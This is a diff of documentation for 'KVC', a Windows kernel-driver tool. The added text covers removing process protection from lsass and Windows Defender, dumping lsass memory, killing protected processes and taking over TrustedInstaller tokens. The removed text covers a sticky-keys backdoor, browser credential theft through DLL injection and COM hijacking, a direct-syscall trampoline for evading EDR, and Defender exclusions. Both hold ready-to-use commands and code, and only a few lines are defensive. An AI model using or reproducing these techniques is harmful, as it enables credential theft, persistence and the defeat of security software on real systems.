+  * **Signer:** Specifies the required signature type for code allowed to interact with the process (e.g., `Antimalware`, `Lsa`, `Windows`, `WinTcb`).
+
+<!-- end list -->
+
+```
+EPROCESS Structure (Conceptual)
++-------------------------+
+| ...                     |
+| UniqueProcessId (PID)   |
+| ActiveProcessLinks      |
+| ...                     |
+| Protection (PS_PROTECTION)| --> Type (3 bits)
+|                         | --> Audit (1 bit)
+|                         | --> Signer (4 bits)
+| ...                     |
+| SignatureLevel          |
+| SectionSignatureLevel   |
+| ...                     |
++-------------------------+
 ```
 
-#### System Registry Access
+Standard user-mode tools lack the privilege to even *read* the memory of highly protected processes (like `lsass.exe` which is often `PPL-WinTcb`).
 
-```bash
-# Export protected security hive for DPAPI key extraction
-kvc.exe trusted "reg export HKLM\SECURITY\Policy\Secrets C:\extract\secrets.reg"
+### How KVC Manipulates Protection
+
+KVC leverages its kernel driver (`kvc.sys`) to directly modify the `Protection` byte within the target process's `EPROCESS` structure in kernel memory.
+
+```mermaid
+graph TD
+    A[kvc.exe requests protection change for PID X] --> B{Controller};
+    B --> C[OffsetFinder: Locate EPROCESS.Protection offset];
+    B --> D[kvcDrv: Get EPROCESS address for PID X];
+    D --> E[Kernel Memory];
+    C --> B;
+    D --> B;
+    B --> F[kvcDrv: Read current Protection byte at Address + Offset];
+    F --> E;
+    E --> F;
+    F --> B;
+    B --> G{Calculate New Protection Byte (Level + Signer)};
+    G --> H[kvcDrv: Write New Protection Byte at Address + Offset];
+    H --> E;
+    E --> H;
+    H --> B;
+    B --> A[Success/Failure];
 ```
 
-#### Persistent Backdoor Installation
+**Key Steps:**
 
-```bash
-# Install sticky keys backdoor (5x Shift = SYSTEM cmd)
-kvc.exe shift
+1.  `kvc.exe` receives the command (e.g., `unprotect lsass`).
+2.  The `Controller` uses `OffsetFinder` to get the dynamic offset of the `Protection` field within the `EPROCESS` structure .
+3.  The `Controller` uses the kernel driver (`kvcDrv`/`kvc.sys`) to find the kernel memory address (`EPROCESS` address) of the target process (e.g., `lsass.exe`) .
+4.  The driver reads the current `Protection` byte at `EPROCESS Address + Protection Offset`.
+5.  The `Controller` calculates the desired new protection byte (e.g., `0x0` for unprotect).
+6.  The driver writes the new protection byte directly into kernel memory at `EPROCESS Address + Protection Offset`.
 
-# Verify installation
-kvc.exe trusted "reg query \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\""
-```
+### Protection Levels and Signer Types
 
-## 🌐 Browser Credential Extraction: The Modern Challenge
+  * **Levels (`PS_PROTECTED_TYPE`)**:
+      * `None` (0): No protection.
+      * `ProtectedLight` (1): PPL - Common for services like LSASS, CSRSS.
+      * `Protected` (2): PP - Highest level, rarer, used for critical media components.
+  * **Signers (`PS_PROTECTED_SIGNER`)**: Define *who* can interact with the protected process.
+      * `None` (0) 
+      * `Authenticode` (1): Standard code signing.
+      * `CodeGen` (2): .NET code generation.
+      * `Antimalware` (3): AV vendors (e.g., MsMpEng.exe).
+      * `Lsa` (4): Local Security Authority.
+      * `Windows` (5): Standard Windows components.
+      * `WinTcb` (6): Trusted Computing Base (e.g., lsass.exe).
+      * `WinSystem` (7): Core system components.
+      * `App` (8): Windows Store apps.
 
-### Evolution of Browser Security
+### Session Management System
 
-Modern browsers have implemented sophisticated credential protection:
+KVC includes a session management system to track protection changes, especially useful for restoring protection after analysis or across reboots .
 
-1. **Encryption**: AES-256-GCM with unique keys
-2. **Process Isolation**: Sandboxing and privilege separation  
-3. **File Locking**: Exclusive database locks during runtime
-4. **DPAPI Integration**: Windows-integrated key management
+  * **Tracking:** When you use `unprotect` (especially `unprotect all` or `unprotect <SIGNER>`), KVC saves the original protection state of the affected processes to the registry under `HKCU\Software\kvc\Sessions\<BootID>\<SignerName>`. Each boot gets a unique session ID based on boot time.
+  * **Reboot Detection:** KVC detects system reboots by comparing current vs saved boot times/tick counts .
+  * **History Limit:** It keeps a history of the last 16 boot sessions, automatically deleting the oldest ones to prevent excessive registry usage .
+  * **Restoration:** The `restore` commands read the saved state from the *current* boot session's registry entries and reapply the original protection levels to processes that still exist . Status is updated in the registry from "UNPROTECTED" to "RESTORED".
 
-### KVC's Browser Exploitation Strategy
+### Protection Manipulation Commands
 
-KVC overcomes these protections through **COM hijacking** and **process injection**:
+  * **List Protected Processes:**
 
-```cpp
-// BrowseCrypt.dll injection workflow
-bool BrowserOrchestrator::ExtractCredentials(const std::wstring& browserName) {
-    // 1. Create suspended target process
-    PROCESS_INFORMATION pi;
-    CreateProcessW(browserPath.c_str(), 
-                   nullptr, nullptr, nullptr, 
-                   FALSE, CREATE_SUSPENDED, 
-                   nullptr, nullptr, &si, &pi);
-    
-    // 2. Inject BrowseCrypt.dll using direct syscalls (EDR evasion)
-    InjectDLL(pi.hProcess, browseCryptDLL);
-    
-    // 3. Resume process with injected payload
-    ResumeThread(pi.hThread);
-    
-    // 4. Payload performs COM elevation hijacking
-    // Creates browser's own elevation service instance
-    // Requests master key decryption from legitimate browser component
-    // Decrypts credential databases with obtained key
-    
-    return true;
-}
-```
+    ```powershell
+    kvc.exe list
+    ```
 
-#### COM Hijacking Technique
+    Shows a color-coded table of all currently running protected processes, including PID, Name, Protection Level, Signer Type, Signature Levels, and Kernel Address . Colors typically indicate the signer type (e.g., Red for LSA, Green for WinTcb).
 
-The injected `BrowseCrypt.dll` exploits browsers' own privilege elevation mechanisms:
+  * **Get Process Protection Status:**
 
-```cpp
-// Inside target browser process address space
-bool MasterKeyDecryptor::HijackElevationService() {
-    CoInitialize(nullptr);
-    
-    // Chrome: IOriginalBaseElevator
-    // Edge: IEdgeElevatorFinal  
-    // Brave: Similar interface
-    
-    IOriginalBaseElevator* elevator;
-    HRESULT hr = CoCreateInstance(CLSID_GoogleUpdate, 
-                                  nullptr, 
-                                  CLSCTX_LOCAL_SERVER,
-                                  IID_IOriginalBaseElevator, 
-                                  (void**)&elevator);
-    
-    // Request decryption using browser's own trusted component
-    BSTR encryptedKey = ReadMasterKeyFromLocalState();
-    BSTR decryptedKey;
-    elevator->DecryptData(encryptedKey, &decryptedKey);
-    
-    // Now possess plaintext AES-256 master key
-    return ProcessCredentialDatabases(decryptedKey);
-}
-```
+    ```powershell
+    kvc.exe get <PID | process_name>
+    kvc.exe info <PID | process_name> # Alias
+    ```
 
-### Supported Browsers and Extraction Results
+    Displays the current protection status (e.g., "PPL-WinTcb") for a specific process identified by PID or name .
 
-| Browser | Method | Credentials | Cookies | Autofill |
-|---------|--------|-------------|---------|----------|
-| Chrome | COM Hijacking | ✅ Full | ✅ Full | ✅ Full |
-| Edge | COM Hijacking | ✅ Full | ✅ Full | ✅ Full |
-| Brave | COM Hijacking | ✅ Full | ✅ Full | ✅ Full |
-| Firefox | Direct Extraction | ✅ Partial | ✅ Full | ❌ Limited |
+  * **Set/Force Protection:**
 
-## 🥷 EDR/AV Evasion: Direct System Calls
+    ```powershell
+    kvc.exe set <PID | process_name | PID1,PID2,...> <PP | PPL> <SIGNER_TYPE>
+    ```
 
-### The User-Mode Hooking Problem
+    Forces the specified protection level and signer type onto the target process(es), overwriting any existing protection . `SIGNER_TYPE` can be names like `WinTcb`, `Antimalware`, etc. . Supports comma-separated lists for batch operations .
 
-Modern EDR solutions monitor system activity by hooking critical APIs:
+  * **Protect Unprotected Process:**
 
-```assembly
-; Traditional API call (MONITORED)
-call    NtCreateThreadEx       ; EDR hook intercepts here
-```
+    ```powershell
+    kvc.exe protect <PID | process_name | PID1,PID2,...> <PP | PPL> <SIGNER_TYPE>
+    ```
 
-### KVC's Direct Syscall Solution
+    Applies protection *only if* the target process(es) are currently unprotected. Fails if the process is already protected . Supports comma-separated lists .
 
-KVC bypasses user-mode hooks entirely by invoking kernel services directly:
+  * **Unprotect Process:**
 
-```assembly
-; Direct syscall (UNMONITORED)
-mov     eax, SSN_NtCreateThreadEx    ; System Service Number
-syscall                              ; Direct kernel transition
-```
+    ```powershell
+    kvc.exe unprotect <PID | process_name | SIGNER_TYPE | PID1,Name2,... | all>
+    ```
 
-#### The ABI Transition Challenge
+    Removes protection (sets Protection byte to 0) from the specified target(s) .
 
-Windows x64 calling conventions differ between user-mode and syscalls:
+      * `<PID | process_name>`: Unprotects a single process.
+      * `<SIGNER_TYPE>`: Unprotects *all* currently running processes matching that signer type (e.g., `kvc unprotect Antimalware`). Saves state for restoration.
+      * `<PID1,Name2,...>`: Unprotects multiple specific processes .
+      * `all`: Unprotects *all* protected processes currently running. Saves state grouped by signer .
 
-```cpp
-// User-mode ABI: RCX, RDX, R8, R9, then stack
-// Syscall ABI: R10, RDX, R8, R9, then stack (RCX replaced with R10)
-```
+  * **Modify Protection by Signer:**
 
-#### AbiTramp.asm: The Critical Trampoline
+    ```powershell
+    kvc.exe set-signer <CURRENT_SIGNER> <PP | PPL> <NEW_SIGNER>
+    ```
 
-```asm
-AbiTramp PROC FRAME
-    ; Standard prologue
-    push    rbp
-    mov     rbp, rsp
-    push    rbx
-    push    rdi  
-    push    rsi
-    sub     rsp, 80h        ; Allocate stack space
-    .ENDPROLOG
-    
-    ; Preserve SYSCALL_ENTRY pointer
-    mov     rbx, rcx
-    
-    ; Marshal arguments: C++ ABI -> Syscall ABI
-    mov     r10, rdx        ; Arg1: RDX -> R10
-    mov     rdx, r8         ; Arg2: R8 -> RDX  
-    mov     r8, r9          ; Arg3: R9 -> R8
-    mov     r9, [rbp+30h]   ; Arg4: Stack -> R9
-    
-    ; Copy additional stack arguments
-    lea     rsi, [rbp+38h]  ; Source: caller stack
-    lea     rdi, [rsp+20h]  ; Dest: syscall stack area
-    mov     rcx, 8          ; Copy 8 qwords
-    rep     movsq
-    
-    ; Load SSN and execute syscall
-    movzx   eax, word ptr [rbx+12]  ; Load System Service Number
-    mov     r11, [rbx]              ; Load syscall gadget address  
-    call    r11                     ; Execute: syscall; ret
-    
-    ; Standard epilogue
-    add     rsp, 80h
-    pop     rsi
-    pop     rdi
-    pop     rbx
-    pop     rbp
-    ret
-AbiTramp ENDP
-```
+    Finds all processes currently protected with `<CURRENT_SIGNER>` and changes their protection to the specified `<PP | PPL>` level and `<NEW_SIGNER>` type .
 
-### EDR Evasion Results
+  * **List Processes by Signer:**
 
-Testing against common EDR solutions:
+    ```powershell
+    kvc.exe list-signer <SIGNER_TYPE>
+    ```
 
-| EDR Solution | Traditional API Calls | KVC Direct Syscalls |
-|--------------|----------------------|-------------------|
-| CrowdStrike Falcon | ❌ Blocked | ✅ Bypassed |
-| SentinelOne | ❌ Blocked | ✅ Bypassed |
-| Carbon Black | ❌ Blocked | ✅ Bypassed |
-| Windows Defender ATP | ⚠️ Alerted | ✅ Clean |
-| Symantec | ❌ Blocked | ✅ Bypassed |
+    Displays a table similar to `kvc list`, but only includes processes matching the specified `<SIGNER_TYPE>` .
 
-## 📊 Command Reference & Usage Examples
+  * **Restore Protection (Session Management):**
 
-### Core Process Protection Commands
+    ```powershell
+    kvc.exe restore <SIGNER_TYPE | all>
+    ```
 
-```bash
-# List all protected processes with color-coded output
+    Restores the original protection state saved during `unprotect` operations *within the current boot session* .
+
+      * `<SIGNER_TYPE>`: Restores protection for processes belonging to the specified signer group .
+      * `all`: Restores protection for all processes tracked in the current session's saved state .
+
+  * **View Session History:**
+
+    ```powershell
+    kvc.exe history
+    ```
+
+    Displays the saved protection states from the last 16 boot sessions, marking the current one . Shows which processes were unprotected under which signer group and their restoration status ("UNPROTECTED" or "RESTORED").
+
+  * **Cleanup Old Sessions:**
+
+    ```powershell
+    kvc.exe cleanup-sessions
+    ```
+
+    Deletes all saved session states from the registry *except* for the current boot session .
+
+**Example Workflow:**
+
+```powershell
+# See which processes are protected
 kvc.exe list
 
-# Query specific process protection status
-kvc.exe get lsass.exe
-kvc.exe info MsMpEng.exe
+# Unprotect Windows Defender and LSASS for analysis
+kvc.exe unprotect Antimalware
+kvc.exe unprotect WinTcb
 
-# Apply protection to unprotected process  
-kvc.exe protect notepad.exe PPL Windows
-kvc protect total PPL WinTcb
+# Perform analysis (e.g., memory dump, instrumentation)
+kvc.exe dump MsMpEng.exe C:\dumps
+kvc.exe dump lsass.exe C:\dumps
+# ... other research actions ...
 
-# Force protection level change (overwrites existing)
-kvc.exe set 5678 PP WinTcb
+# Restore original protection using saved session state
+kvc.exe restore Antimalware
+kvc.exe restore WinTcb
+# OR restore everything modified in this session
+# kvc.exe restore all
 
-# Remove protection (single, multiple, or all)
-kvc.exe unprotect lsass.exe
-kvc.exe unprotect 1234,5678,9012
-kvc.exe unprotect all
+# Verify protection is back
+kvc.exe list
 ```
 
-### Memory Acquisition Commands
+-----
 
-```bash
-# Dump LSASS to Downloads folder (default)
-kvc.exe dump lsass
+## 7\. Advanced Memory Dumping
 
-# Dump specific PID to custom location
-kvc.exe dump 1044 C:\Windows\Temp
+Acquiring memory dumps of protected processes like `lsass.exe` (Local Security Authority Subsystem Service) is critical for credential extraction and forensic analysis but is blocked by PP/PPL on modern Windows. KVC bypasses these restrictions.
 
-# Dump by process name with custom path
-kvc.exe dump chrome.exe D:\path
+### The Challenge with Protected Processes
+
+Standard tools like Task Manager, `procdump.exe`, or Process Explorer operate in user mode and request memory access via standard Windows APIs (e.g., `OpenProcess`, `ReadProcessMemory`). The Kernel Security Reference Monitor denies these requests when targeting a process with a higher protection level (PP/PPL) than the requesting tool (even if running as Administrator).
+
+### KVC's Kernel-Mode Approach
+
+KVC circumvents this by using its kernel driver and, optionally, self-protection elevation:
+
+```mermaid
+sequenceDiagram
+    participant User
+    participant KVC_EXE as kvc.exe
+    participant KVC_SYS as kvc.sys (Kernel)
+    participant Target_PPL as Target Process (e.g., LSASS)
+    participant DbgHelp_DLL as DbgHelp.dll
+
+    User->>KVC_EXE: kvc dump lsass C:\dumps
+    KVC_EXE->>KVC_EXE: Load Driver (kvc.sys)
+    KVC_EXE->>KVC_SYS: Get LSASS EPROCESS Address & Protection
+    KVC_SYS-->>KVC_EXE: Return Addr, Protection (e.g., PPL-WinTcb)
+    Note over KVC_EXE: Determines LSASS is PPL-WinTcb 
+
+    %% Optional Self-Protection (Auxiliary)
+    % KVC_EXE->>KVC_SYS: Set KVC Process Protection to PPL-WinTcb 
+    % Note over KVC_EXE: Self-protection helps, but direct kernel access is key.
+
+    KVC_EXE->>OS: OpenProcess(LSASS_PID, PROCESS_VM_READ | ...)
+    Note over OS: Access potentially granted due to matching protection OR kernel bypass
+    OS-->>KVC_EXE: Return hProcess handle for LSASS
+
+    KVC_EXE->>FS: CreateFileW("C:\dumps\lsass.exe_PID.dmp") 
+    FS-->>KVC_EXE: Return hFile handle
+
+    KVC_EXE->>DbgHelp_DLL: MiniDumpWriteDump(hProcess, LSASS_PID, hFile, FullMemory) 
+    DbgHelp_DLL-->>Target_PPL: Read Memory Regions
+    Target_PPL-->>DbgHelp_DLL: Provide Memory Data
+    DbgHelp_DLL-->>FS: Write Dump Data to hFile
+    FS-->>DbgHelp_DLL: Confirm Write
+    DbgHelp_DLL-->>KVC_EXE: Return Success/Failure
+
+    KVC_EXE->>FS: CloseHandle(hFile)
+    KVC_EXE->>OS: CloseHandle(hProcess)
+
+    %% Optional Self-Protection Cleanup
+    % KVC_EXE->>KVC_SYS: Set KVC Process Protection back to None 
+
+    KVC_EXE->>KVC_EXE: Unload Driver
+    KVC_EXE-->>User: Success! Dump created at C:\dumps\lsass...
 ```
 
-### Advanced System Integration
+**Explanation:**
 
-```bash
-# Install sticky keys backdoor (5x Shift = SYSTEM cmd)
-kvc.exe shift
+1.  KVC identifies the target process (e.g., `lsass.exe`) and its protection level (e.g., `PPL-WinTcb`) using kernel operations .
+2.  *(Optional but helpful)* KVC can elevate its *own* process protection level to match the target's level (e.g., to `PPL-WinTcb`) . This helps satisfy some access checks performed by APIs like `OpenProcess`.
+3.  KVC calls `OpenProcess` to get a handle to the target process with memory read permissions (`PROCESS_VM_READ`). Even if self-protection isn't used or fails, the kernel-level modifications often bypass standard checks.
+4.  KVC creates the output dump file.
+5.  KVC calls the `MiniDumpWriteDump` function (from `DbgHelp.dll`), providing the process handle, PID, and file handle. This function handles the complexities of reading process memory (including suspended threads, handle data, etc.) and writing it to the dump file. KVC uses flags for a full memory dump (`MiniDumpWithFullMemory`) to capture maximum data.
+6.  Handles are closed, self-protection (if applied) is removed, and the driver is unloaded.
 
-# Remove sticky keys backdoor
-kvc.exe unshift  
+### Undumpable Processes
 
-# Execute command with TrustedInstaller privileges
-kvc.exe trusted cmd
-kvc trusted Shortcut.lnk
+Certain core system components operate at a level where even kernel-mode dumping is impossible or leads to instability. KVC specifically prevents attempts to dump these:
 
-# Add Windows Defender exclusions
-kvc.exe add-exclusion Paths C:\Tools
-kvc.exe add-exclusion Processes malware.exe
-kvc.exe add-exclusion Extensions .dmp
+  * **System (PID 4):** The main kernel process.
+  * **Secure System:** The process hosting the Virtual Secure Mode (VSM) / VBS components.
+  * **Registry:** The kernel's registry hive manager.
+  * **Memory Compression:** The kernel's memory management process.
 
-# Install as NT service for persistence
-kvc.exe install
-kvc.exe service status
-kvc.exe service stop
-kvc.exe service start
-kvc.exe uninstall
+Attempting to dump these will result in an error message from KVC .
 
-#Auto-install to System32 + Windows Defender exclusions
-kvc setup
+### Memory Dumping Commands
 
-```
+  * **Dump Process:**
+    ```powershell
+    kvc.exe dump <PID | process_name> [output_path]
+    ```
+    Creates a full memory dump (`.dmp` file) of the specified process .
+      * `<PID | process_name>`: Target process identifier.
+      * `[output_path]`: Optional directory to save the dump file. If omitted, the file is saved to the user's `Downloads` folder . The filename will be `processname_PID.dmp`.
 
-### Browser Credential Extraction
+**Examples:**
 
-```bash
-# Extract Chrome credentials using COM hijacking
-kvc.exe bp --chrome -o C:\extracted
-
-# Extract all browser credentials
-kvc.exe bp --chrome --brave --edge
-
-# DPAPI-based extraction (legacy method)
-kvc.exe export secrets C:\dpapi
-```
-
-### Service Management (Advanced Deployment)
-
-```bash
-# Install as Windows service
-kvc.exe install
-
-# Service lifecycle management
-kvc.exe service start
-kvc.exe service stop  
-kvc.exe service status
-
-# Complete removal
-kvc.exe service stop
-kvc.exe uninstall
-```
-
-## 🔧 Technical Implementation Details
-
-### Kernel Driver Architecture
-
-The embedded `kvc.sys` driver implements minimal functionality for maximum stealth:
-
-```cpp
-// Primary IOCTL handlers
-#define RTC_IOCTL_MEMORY_READ   0x80002048
-#define RTC_IOCTL_MEMORY_WRITE  0x8000204c
-
-NTSTATUS DriverDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
-    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
-    
-    switch (stack->Parameters.DeviceIoControl.IoControlCode) {
-        case RTC_IOCTL_MEMORY_READ:
-            return HandleMemoryRead(Irp);
-        case RTC_IOCTL_MEMORY_WRITE:  
-            return HandleMemoryWrite(Irp);
-        default:
-            return STATUS_INVALID_DEVICE_REQUEST;
-    }
-}
-```
-
-### Steganographic Driver Deployment
-
-The driver is embedded within the main executable's resources:
-
-```cpp
-// Extract embedded driver from icon resource
-HRSRC hRes = FindResource(nullptr, MAKEINTRESOURCE(IDR_MAINICON), RT_ICON);
-HGLOBAL hMem = LoadResource(nullptr, hRes);
-LPBYTE pData = static_cast<LPBYTE>(LockResource(hMem));
-
-// Skip icon header, decrypt driver with XOR key
-const BYTE xorKey[] = {0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C};
-DecryptDriver(pData + iconHeaderSize, driverSize, xorKey);
-```
-
-### Atomic Operation Model
-
-Every KVC operation follows strict atomic principles:
-
-```cpp
-class Controller {
-    bool PerformAtomicInit() {
-        // 1. Extract and decrypt embedded driver
-        // 2. Create temporary service entry
-        // 3. Load driver into kernel  
-        // 4. Establish communication channel
-        return success;
-    }
-    
-    void PerformAtomicCleanup() {
-        // 1. Close driver communication
-        // 2. Unload driver from kernel
-        // 3. Delete service entry
-        // 4. Clean temporary files
-        // 5. Restore system state
-    }
-};
-```
-
-### Error Handling and Stability
-
-KVC implements comprehensive error handling:
-
-```cpp
-// RAII resource management
-using HandleDeleter = std::function<void(HANDLE)>;
-using UniqueHandle = std::unique_ptr<void, HandleDeleter>;
-
-UniqueHandle hProcess(OpenProcess(...), [](HANDLE h) { 
-    if (h != INVALID_HANDLE_VALUE) CloseHandle(h); 
-});
-
-// Optional return types for fallible operations
-std::optional<ULONG64> GetProcessKernelAddress(DWORD pid) {
-    // Implementation with proper error handling
-    if (!success) return std::nullopt;
-    return kernelAddress;
-}
-```
-
-## 🛡️ Security Considerations
-
-### Detection Vectors
-
-While designed for stealth, KVC may leave forensic artifacts:
-
-#### Event Log Artifacts
-- **Event ID 7045**: Service installation (System log)
-- **Event ID 7036**: Service start/stop (System log)
-- **Event ID 4688**: Process creation (Security log)
-
-#### File System Artifacts
-- Temporary driver files in `%TEMP%` or `%WINDIR%\Temp`
-- Memory dump files (`.dmp`) in target directories
-- Credential extraction reports (`.html`, `.json`, `.txt`)
-
-#### Registry Artifacts  
-- Service entries under `HKLM\System\CurrentControlSet\Services\KernelVulnerabilityControl`
-- Sticky keys IFEO modifications
-- Windows Defender exclusion entries
-
-#### Process Artifacts
-- Suspended browser processes with injected threads
-- Elevated processes running with TrustedInstaller tokens
-- Modified EPROCESS protection fields in kernel memory
-
-### Defensive Countermeasures
-
-Organizations can implement several countermeasures:
-
-#### Event Monitoring
 ```powershell
-# Monitor for KVC-specific service installations
-Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045} | 
-Where-Object {$_.Message -like "*KernelVulnerabilityControl*"}
+# Dump LSASS to the Downloads folder
+kvc.exe dump lsass.exe
 
-# Monitor for suspicious process protection changes
-# (Requires advanced kernel monitoring tools)
+# Dump process with PID 1234 to C:\temp
+kvc.exe dump 1234 C:\temp
+
+# Dump Chrome main process to D:\dumps
+kvc.exe dump chrome.exe D:\dumps
 ```
 
-#### Process Monitoring
+**Note:** Dumping anti-malware processes (like `MsMpEng.exe`) often requires disabling the anti-malware service first, as they employ aggressive self-protection mechanisms beyond standard PP/PPL. Dumping may hang or fail otherwise.
+
+-----
+
+## 8\. Process Termination (Killing Processes)
+
+Similar to memory dumping, terminating protected processes is restricted by Windows. KVC provides a `kill` command that overcomes these limitations.
+
+### The Challenge with Protected Processes
+
+Standard tools like Task Manager (`taskkill.exe`) use the `TerminateProcess` API. This API call fails with "Access Denied" if the calling process does not have sufficient privileges relative to the target process's protection level (PP/PPL).
+
+### KVC's Elevated Termination
+
+KVC's `kill` command uses a similar strategy to memory dumping:
+
+```mermaid
+sequenceDiagram
+    participant User
+    participant KVC_EXE as kvc.exe
+    participant KVC_SYS as kvc.sys (Kernel)
+    participant Target_PPL as Target Process (e.g., LSASS)
+
+    User->>KVC_EXE: kvc kill lsass
+    KVC_EXE->>KVC_EXE: Load Driver (kvc.sys)
+    KVC_EXE->>KVC_SYS: Get LSASS EPROCESS Address & Protection
+    KVC_SYS-->>KVC_EXE: Return Addr, Protection (e.g., PPL-WinTcb) 
+    Note over KVC_EXE: Determines LSASS is PPL-WinTcb 
+
+    KVC_EXE->>KVC_SYS: Set KVC Process Protection to PPL-WinTcb 
+    Note over KVC_EXE: Elevates self to match target
+
+    KVC_EXE->>OS: OpenProcess(LSASS_PID, PROCESS_TERMINATE) 
+    Note over OS: Access granted due to matching protection level
+    OS-->>KVC_EXE: Return hProcess handle for LSASS
+
+    KVC_EXE->>OS: TerminateProcess(hProcess, 1) 
+    OS-->>Target_PPL: Terminate Execution
+    OS-->>KVC_EXE: Return Success/Failure
+
+    KVC_EXE->>OS: CloseHandle(hProcess)
+
+    KVC_EXE->>KVC_SYS: Set KVC Process Protection back to None
+    KVC_EXE->>KVC_EXE: Unload Driver
+    KVC_EXE-->>User: Success! Process terminated.
+```
+
+**Explanation:**
+
+1.  KVC identifies the target process and its protection level .
+2.  It elevates its *own* protection level to match the target's (e.g., `PPL-WinTcb`) using the kernel driver.
+3.  Now running at an equal or higher protection level, KVC calls `OpenProcess` with `PROCESS_TERMINATE` permission. This typically succeeds due to the elevated protection.
+4.  KVC calls `TerminateProcess` using the obtained handle.
+5.  KVC restores its own protection level to `None`, closes handles, and unloads the driver.
+
+### Process Targeting
+
+The `kill` command supports flexible targeting:
+
+  * **By PID:** `kvc kill 1234`
+  * **By Exact Name:** `kvc kill notepad.exe`
+  * **By Partial Name (Case-Insensitive):** `kvc kill note` (matches `notepad.exe`), `kvc kill total` (matches `Totalcmd64.exe`). If multiple processes match a partial name, KVC might terminate all or require a more specific name (behavior depends on implementation details not fully shown, but likely uses pattern matching similar to `FindProcessesByName` ).
+  * **Comma-Separated List:** `kvc kill 1234,notepad,WmiPrvSE.exe`. KVC parses the list and attempts to terminate each target .
+
+### Process Termination Command
+
+  * **Terminate Process(es):**
+    ```powershell
+    kvc.exe kill <PID | process_name | PID1,Name2,...>
+    ```
+    Terminates one or more processes specified by PID, name (exact or partial), or a comma-separated list. Automatically elevates KVC's protection level if necessary to terminate protected targets.
+
+**Examples:**
+
 ```powershell
-# Monitor for suspended browser processes
-Get-Process | Where-Object {$_.ProcessName -match "chrome|edge|brave" -and $_.Threads.Count -eq 0}
+# Terminate process by PID
+kvc.exe kill 5678
+
+# Terminate Notepad by name
+kvc.exe kill notepad.exe
+
+# Terminate LSASS (protected process)
+kvc.exe kill lsass
+
+# Terminate multiple processes
+kvc.exe kill 1122,explorer.exe,conhost.exe
 ```
 
-#### Registry Monitoring
-```powershell  
-# Monitor sticky keys IFEO modifications
-Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -ErrorAction SilentlyContinue
+-----
+
+## 9\. TrustedInstaller Integration
+
+`NT SERVICE\TrustedInstaller` is a built-in Windows account with privileges exceeding even those of a standard Administrator. It owns critical system files and registry keys and can bypass many security restrictions. KVC integrates with TrustedInstaller to perform highly privileged operations.
+
+### TrustedInstaller Privileges
+
+  * Owns essential system files (`C:\Windows\System32`, etc.) and registry hives (`HKLM\SECURITY`, `HKLM\SAM`).
+  * Can modify Windows Defender settings, including exclusions and service state.
+  * Bypasses most Access Control List (ACL) restrictions.
+
+### How KVC Acquires TrustedInstaller Privileges
+
+KVC uses a multi-step process to obtain and utilize a TrustedInstaller token:
+
+```mermaid
+sequenceDiagram
+    participant KVC_EXE as kvc.exe
+    participant OS as Windows OS (Security Subsystem)
+    participant Winlogon as winlogon.exe (Running as SYSTEM)
+    participant SCM as Service Control Manager (Running as SYSTEM)
+    participant TI_SVC as TrustedInstaller Service (Runs as TrustedInstaller)
+
+    KVC_EXE->>KVC_EXE: Enable SeDebugPrivilege, SeImpersonatePrivilege 
+    KVC_EXE->>Winlogon: OpenProcess(PROCESS_QUERY_INFORMATION)
+    KVC_EXE->>Winlogon: OpenProcessToken(TOKEN_DUPLICATE)
+    Winlogon-->>KVC_EXE: Return SYSTEM Token Handle
+    KVC_EXE->>KVC_EXE: DuplicateTokenEx (Primary -> Impersonation)
+    KVC_EXE->>OS: ImpersonateLoggedOnUser(SYSTEM Impersonation Token) 
+    Note over KVC_EXE: KVC Thread now running as SYSTEM
+
+    KVC_EXE->>SCM: OpenSCManager(SC_MANAGER_ALL_ACCESS)
+    KVC_EXE->>SCM: OpenService("TrustedInstaller", SERVICE_START)
+    KVC_EXE->>SCM: StartService("TrustedInstaller") 
+    SCM->>TI_SVC: Start Service
+    TI_SVC-->>SCM: Service Started (Process ID: TI_PID)
+    SCM-->>KVC_EXE: Return TI_PID 
+    Note over KVC_EXE: TrustedInstaller process is now running
+
+    KVC_EXE->>TI_SVC: OpenProcess(TI_PID, PROCESS_QUERY_INFORMATION) 
+    KVC_EXE->>TI_SVC: OpenProcessToken(TOKEN_DUPLICATE | ...) 
+    TI_SVC-->>KVC_EXE: Return TrustedInstaller Token Handle
+    KVC_EXE->>KVC_EXE: DuplicateTokenEx (Primary Token) 
+    Note over KVC_EXE: Now holds a usable TrustedInstaller Primary Token
+    KVC_EXE->>KVC_EXE: Cache Token 
+
+    KVC_EXE->>OS: RevertToSelf() 
+    Note over KVC_EXE: KVC Thread returns to original context (Administrator)
+
+    Note over KVC_EXE: When needed...
+    KVC_EXE->>OS: ImpersonateLoggedOnUser(Cached TI Token) 
+    KVC_EXE->>OS: Perform Privileged Operation (e.g., CreateFileW, RegSetValueExW)
+    KVC_EXE->>OS: RevertToSelf() 
+    %% OR for running commands
+    % KVC_EXE->>OS: CreateProcessWithTokenW(Cached TI Token, command) 
 ```
 
-## 📈 Performance Characteristics
+**Explanation:**
 
-### Operation Benchmarks
+1.  KVC enables `SeDebugPrivilege` and `SeImpersonatePrivilege` for its own process.
+2.  It finds a process running as `SYSTEM` (typically `winlogon.exe`) , opens its token, duplicates it for impersonation, and calls `ImpersonateLoggedOnUser`. The KVC thread now temporarily operates as `SYSTEM`.
+3.  Running as `SYSTEM`, KVC uses the Service Control Manager (SCM) to ensure the `TrustedInstaller` service is started. It gets the Process ID (PID) of the running service.
+4.  KVC opens the `TrustedInstaller` process  and its primary token.
+5.  It duplicates the `TrustedInstaller` primary token.
+6.  KVC enables *all* possible privileges on this duplicated token for maximum capability .
+7.  KVC reverts its thread context back to the original user (Administrator).
+8.  The duplicated, fully privileged `TrustedInstaller` token is cached.
+9.  When a command requires TrustedInstaller privileges (e.g., `kvc trusted ...`, `kvc add-exclusion ...`, writing protected files/registry keys), KVC either:
+      * Temporarily impersonates using the cached token (`ImpersonateLoggedOnUser`), performs the operation (like `CreateFileW`, `RegSetValueExW`), and reverts (`RevertToSelf`).
+      * Launches a new process directly using the cached token via `CreateProcessWithTokenW` (for the `kvc trusted <command>` functionality).
 
-| Operation | Duration | Memory Usage | Disk I/O |
-|-----------|----------|--------------|----------|
-| Driver Load/Unload | ~200ms | 2MB | 512KB |
